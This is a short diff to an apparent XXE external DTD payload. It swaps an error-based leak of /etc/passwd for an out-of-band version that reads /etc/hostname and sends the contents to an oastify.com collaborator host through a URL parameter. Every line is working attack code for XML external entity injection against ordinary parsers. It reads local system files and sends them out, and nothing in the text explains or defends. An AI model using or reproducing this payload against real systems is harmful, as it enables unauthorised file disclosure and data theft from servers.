@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///NOEXISTE/%file;'>">
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'https://4uzk10te6miiwqojgqyimfwlacg341sq.oastify.com/?x=%file;'>">
 %eval;
-%error;
+%send;
